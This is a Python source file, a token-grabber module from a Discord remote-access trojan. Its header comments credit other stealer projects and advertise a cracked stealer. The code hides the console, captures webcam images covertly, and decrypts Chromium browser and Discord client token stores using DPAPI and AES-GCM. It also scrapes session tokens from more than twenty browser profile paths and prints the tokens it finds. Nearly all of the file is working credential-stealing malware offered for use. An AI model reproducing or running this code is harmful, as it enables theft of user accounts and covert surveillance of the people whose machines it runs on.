import os
import re
import json
import base64
import ctypes
from urllib3 import PoolManager
import pyaes


# This RAT is made by H-zz-H!  
# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  

# Sources I skidded from:  
# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
# Tried doing it on my own (but I’m way too retarded for that).
# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
# Almost everything in this project is inspired by him.  

# Thanks for taking the time to read.  
# Love y’all. Bye.  
# ~~~ H-zz-H ~~~  

# This is the token grab.py file. It is used to grab tokens from browsers or discord client.
# Implemented in the RAT right now!!!!

def CaptureWebcam(index: int, filePath: str) -> bool:
    avicap32 = ctypes.windll.avicap32
    WS_CHILD = 0x40000000
    WM_CAP_DRIVER_CONNECT = 0x0400 + 10
    WM_CAP_DRIVER_DISCONNECT = 0x0402
    WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25

    hcam = avicap32.capCreateCaptureWindowW(
        ctypes.wintypes.LPWSTR("Blank"),
        WS_CHILD,
        0, 0, 0, 0,
        ctypes.windll.user32.GetDesktopWindow(), 0
    )

    result = False

    if hcam:
        if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, ctypes.wintypes.LPWSTR(filePath)):
                result = True
            ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
        ctypes.windll.user32.DestroyWindow(hcam)

    return result

def CreateMutex(mutex: str) -> bool:
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexA(None, False, mutex)
    return kernel32.GetLastError() != 183

def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.c_ulong),
            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
        ]

    pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()
    pOptionalEntropy = None

    if optional_entropy is not None:
        optional_entropy = optional_entropy.encode("utf-16")
        pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
        data = (ctypes.c_ubyte * pDataOut.cbData)()
        ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
        ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
        return bytes(data)

    raise ValueError("Invalid encrypted_data provided!")

def HideConsole() -> None:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


# Discord function replacements
httpClient = PoolManager(cert_reqs="CERT_NONE")
ROAMING = os.getenv("appdata")
LOCALAPPDATA = os.getenv("localappdata")
REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

def GetHeaders(token: str = None) -> dict:
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
    }
    if token:
        headers["authorization"] = token
    return headers

def GetTokens():
    results = []
    tokens = []
    paths = get_paths()

    for name, path in paths.items():
        if os.path.exists(path):
            tokens += SafeStorageSteal(path)
            tokens += SimpleSteal(path)
            if "FireFox" in name:
                tokens += FireFoxSteal(path)

    return tokens

def SafeStorageSteal(path: str) -> list[str]:
    encryptedTokens = []
    tokens = []
    key = None
    levelDbPaths = []

    localStatePath = os.path.join(path, "Local State")

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    if os.path.isfile(localStatePath) and levelDbPaths:
        with open(localStatePath, errors="ignore") as file:
            jsonContent = json.load(file)

        key = jsonContent['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX_ENC, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if match not in encryptedTokens:
                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
                                    missing_padding = 4 - (len(match) % 4)
                                    if missing_padding:
                                        match += b'=' * missing_padding
                                    match = base64.b64decode(match)
                                    encryptedTokens.append(match)

    for token in encryptedTokens:
        try:
            token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
            if token:
                tokens.append(token)
        except Exception:
            pass

    return tokens

def SimpleSteal(path: str) -> list[str]:
    tokens = []
    levelDbPaths = []

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    for levelDbPath in levelDbPaths:
        for file in os.listdir(levelDbPath):
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(levelDbPath, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                for line in lines:
                    if line.strip():
                        matches = re.findall(REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)

    return tokens

def FireFoxSteal(path: str) -> list[str]:
    tokens = []

    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                filepath = os.path.join(root, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)

    return tokens

def get_paths():
    return {
        "Discord": os.path.join(ROAMING, "discord"),
        "Discord Canary": os.path.join(ROAMING, "discordcanary"),
        "Lightcord": os.path.join(ROAMING, "Lightcord"),
        "Discord PTB": os.path.join(ROAMING, "discordptb"),
        "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
        "FireFox": os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),
        "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
    }
def tokenoutput():
    tokens = GetTokens()
    
    if tokens:
        unique_tokens = set()
        for token in tokens:
            if token not in unique_tokens:
                unique_tokens.add(token)
                print(f"{token}")
    else:
        print("No Tokens Found.")

if __name__ == "__main__":
    tokenoutput()
